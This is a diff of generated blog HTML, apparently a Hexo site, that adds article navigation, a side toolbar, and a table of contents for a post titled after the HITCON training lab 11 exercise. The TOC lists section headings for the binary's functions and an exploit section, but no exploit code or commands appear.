-        <time datetime="2021-09-06T08:06:36.101Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-06</time>
-</a>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/2021/09/06/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Hello World</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2021/09/06/hello-world/">Hello World</a>
-	
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#HITCON-training-lab-11"><span class="toc-number">1.</span> <span class="toc-text">HITCON training lab 11</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#checksec%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.</span> <span class="toc-text">checksec检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">main函数如下：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add-item%E5%87%BD%E6%95%B0%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">add_item函数如下：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show-item%E5%87%BD%E6%95%B0%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">show_item函数如下：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#change-item%E5%87%BD%E6%95%B0%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">change_item函数如下：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#remove-item%E5%87%BD%E6%95%B0%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">1.6.</span> <span class="toc-text">remove_item函数如下：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#magic%E5%87%BD%E6%95%B0%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">1.7.</span> <span class="toc-text">magic函数如下：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">1.8.</span> <span class="toc-text">利用：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">1.9.</span> <span class="toc-text">exp如下：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-number">1.10.</span> <span class="toc-text">参考链接：</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
+        
+    </div>
+</aside>
 
-    
+
+
+
+
+
+
+
+
+
+
+
 
 
           </div>
@@ -346,8 +445,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
